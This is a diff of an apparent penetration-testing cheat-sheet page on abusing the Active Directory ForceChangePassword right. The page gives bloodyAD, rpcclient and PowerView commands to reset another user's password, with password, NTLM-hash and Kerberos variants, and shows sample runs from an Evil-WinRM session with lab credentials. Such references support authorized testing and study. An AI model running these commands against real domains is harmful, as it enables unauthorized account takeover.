@@ -1,40 +1,50 @@
 ---
 title: "ForceChangePassword"
-tags: ["Forcechangepassword", "Powerview", "Active Directory", "Windows", "bloodyAD"]
+tags: ["Active Directory", "ForceChangePassword", "Forcechangepassword", "Powerview", "Windows", "bloodyAD"]
 ---
 
-### Change Target User Password (From Linux)
+{{< filter_buttons >}}
 
-{{< tab set1 tab1 >}}BloodyAD{{< /tab >}}
-{{< tab set1 tab2 >}}rpcclient{{< /tab >}}
+### Change Target User Password
+
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+{{< tab set1-1 tab1 active>}}bloodyAD{{< /tab >}}{{< tab set1-1 tab2 >}}rpcclient{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
 
-```console
+```console {class="password"}
 # Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
 ```
 
-```console {class="sample-code"}
-bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234'
-[+] Password changed successfully!
-```
-
-```console
+```console {class="ntlm"}
 # NTLM
 bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
 ```
 
-```console
-# Kerberos
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+ bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
 ```
 
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
+{{< tabcontent set1-1 tab2 >}}
 
-```console
+```console {class="password"}
+# Password
 rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <NEW_PASSWORD>'
 ```
 
@@ -43,11 +53,10 @@ $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2
 ```
 
 {{< /tabcontent >}}
-
-### Change Target User Password (From Windows)
-
-{{< tab set2 tab1 >}}Windows{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+{{< tab set1-2 tab1 active>}}powershell{{< /tab >}}
+{{< tabcontent set1-2 tab1 >}}
 
 #### 1. Import PowerView
 
@@ -59,36 +68,23 @@ $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2
 *Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
 ```
 
-#### 2. Create a Cred Object (runas) \[Optional\]
-
-```console
-$username = '<DOMAIN>\<USER>'
-```
-
-```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-```
-
-```console
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
-```
-
-#### 3. Change Target User Password
+#### 2. Change Target User Password
 
 ```console
 $password = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
 ```
 
 ```console {class=sample-code}
-*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force
+*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 ```
 
 ```console
-Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password -Credential $Cred
+Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
 ```
 
 ```console {class=sample-code}
 *Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity gibdeon -AccountPassword $password
 ```
 
+{{< /tabcontent >}}
 {{< /tabcontent >}}
